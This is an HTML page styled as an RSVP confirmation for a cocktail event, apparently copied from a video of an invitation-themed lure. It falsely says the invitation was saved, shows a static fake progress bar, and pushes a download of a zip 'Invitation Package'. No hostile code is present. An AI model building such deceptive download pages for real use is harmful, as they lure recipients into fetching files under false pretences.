<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RSVP Confirmed | Cocktails & Conversation</title>
    <style>
        /* EXACT VISUAL REPLICATION FROM VIDEO */
        body {
            margin: 0;
            padding: 0;
            background-color: #1a1b26; /* Dark navy/black from video */
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .card {
            background: rgba(30, 32, 45, 0.95);
            border: 1px solid #2a2c3d;
            border-radius: 8px;
            padding: 40px 50px;
            text-align: center;
            max-width: 450px;
            width: 90%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .check-icon {
            width: 60px;
            height: 60px;
            border: 2px solid #d4af37; /* Gold border */
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            color: #d4af37;
            font-size: 28px;
            font-weight: bold;
        }

        h1 {
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 16px;
            letter-spacing: 0.5px;
            color: #ffffff;
        }

        p.subtitle {
            font-size: 14px;
            line-height: 1.6;
            color: #a0a5b5;
            margin-bottom: 32px;
        }

        /* PROGRESS BAR STYLING (MATCHES VIDEO) */
        .progress-container {
            width: 100%;
            background-color: #2a2c3d;
            border-radius: 4px;
            height: 6px;
            margin-bottom: 16px;
            overflow: hidden;
        }

        .progress-bar {
            width: 25%; /* Static match to video snapshot */
            height: 100%;
            background-color: #d4af37; /* Gold fill */
            transition: width 0.3s ease;
        }

        .status-text {
            font-size: 13px;
            color: #8a8f98;
            margin-bottom: 32px;
        }

        /* DOWNLOAD BUTTON STYLED AS ACTION */
        .action-btn {
            display: inline-block;
            padding: 12px 32px;
            background: transparent;
            border: 1px solid #d4af37;
            color: #d4af37;
            text-decoration: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            cursor: pointer;
            margin-top: 10px;
        }

        .action-btn:hover {
            background: #d4af37;
            color: #1a1b26;
        }

        .footer-note {
            margin-top: 40px;
            font-size: 11px;
            color: #555;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- CHECKMARK ICON -->
        <div class="check-icon">✓</div>
        
        <h1>You're on the list!</h1>
        <p class="subtitle">
            Your response has been received. Your digital invitation has been saved to your device.
        </p>

        <!-- PROGRESS BAR (VISUAL MATCH TO VIDEO) -->
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
        <p class="status-text">Your response is being confirmed. This usually only takes a few minutes.</p>

        <!-- SAFE DOWNLOAD LINK -->
        <a href="/static/Cocktails_Event_Details.zip" class="action-btn" download>
            Download Invitation Package
        </a>

        <p class="footer-note">We can't wait to see you there</p>
    </div>
</body>
</html>
